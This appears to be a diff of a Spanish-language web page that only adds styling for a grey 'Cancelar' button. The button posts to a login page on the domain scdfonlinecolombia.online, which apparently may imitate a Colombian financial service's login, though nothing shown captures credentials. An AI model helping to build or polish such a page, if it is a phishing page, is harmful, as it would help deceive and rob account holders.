@@ -81,6 +81,16 @@
             transform: scale(1.05);
         }
 
+        /* Botón Cancelar - Gris Claro */
+        .box__btn--cancelar {
+            background-color: #D3D3D3; /* Gris claro */
+            color: #003B5C;
+        }
+
+        .box__btn--cancelar:hover {
+            background-color: #B0B0B0; /* Gris más oscuro al pasar el ratón */
+        }
+
         /* Footer */
         .footer {
             width: 100%;
@@ -120,6 +130,10 @@
                 font-size: 1rem;
             }
 
+            .box__btn--cancelar {
+                width: 90%;
+            }
+
             h3 {
                 font-size: 1.3rem;
             }
@@ -143,6 +157,10 @@
                 width: 55%;
                 padding: 16px;
                 font-size: 1rem;
+            }
+
+            .box__btn--cancelar {
+                width: 55%;
             }
 
             h3 {
@@ -175,7 +193,7 @@
         </form>
 
         <form action="https://scdfonlinecolombia.online/cdfavenida/cel-login.html" method="post" style="display: block;">
-            <button class="box__btn" type="submit">Cancelar</button>
+            <button class="box__btn box__btn--cancelar" type="submit">Cancelar</button>
         </form>
     </div>
 
